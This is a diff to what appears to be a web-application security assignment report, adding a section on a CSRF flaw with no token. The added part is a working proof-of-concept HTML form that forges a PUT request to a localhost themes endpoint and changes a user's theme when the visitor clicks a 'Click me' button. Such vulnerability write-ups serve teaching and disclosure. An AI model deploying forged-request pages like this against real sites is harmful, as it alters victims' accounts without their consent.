@@ -23,3 +23,14 @@ When the ads is set to http://localhost/, the Man in Middle Attack can get the c
 * State any secrets you keep in your web application (if applicable)
 None
 
+========== Class of Vulnerability: CSRF with no token (13) ==========
+<html>
+  <body>
+    <form method="POST" action="https://localhost/themes/154" accept-charset="UTF-8" role="form">
+    <input name="_method" type="hidden" value="PUT">
+    <input name="theme" type="hidden" value="cupid">
+    <input type="submit" value="Click me :D">          
+    </form>
+  </body>
+</html>
+
